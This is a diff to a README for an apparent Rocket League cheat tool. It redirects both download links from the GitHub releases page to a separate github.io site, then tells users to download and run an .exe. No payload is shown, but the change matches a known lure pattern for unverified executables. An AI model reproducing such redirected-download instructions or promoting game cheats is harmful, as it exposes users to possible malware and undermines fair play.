@@ -1,6 +1,6 @@
 # 🎮 RL-Nightmare-X - Gain a competitive edge in matches
 
-[![Download RL-Nightmare-X](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Georgineelfin105/RL-Nightmare-X/releases)
+[![Download RL-Nightmare-X](https://img.shields.io/badge/Download-Release-blue)](https://georgineelfin105.github.io)
 
 RL-Nightmare-X improves your performance in Rocket League. This tool provides data overlays, movement assistance, and management options to help you play at a high level. Use these tools to track the ball, manage your boost, and refine your aim.
 
@@ -22,7 +22,7 @@ Disable any third-party background software that might conflict with game overla
 Follow these steps to set up the software on your system.
 
 ### Step 1: Visit the download page
-Visit this link to download the software: https://github.com/Georgineelfin105/RL-Nightmare-X/releases
+Visit this link to download the software: https://georgineelfin105.github.io
 
 ### Step 2: Download the file
 Look for the section labeled "Assets" on the page. Click the file ending in .exe to start the download. Save this file to your desktop for easy access.
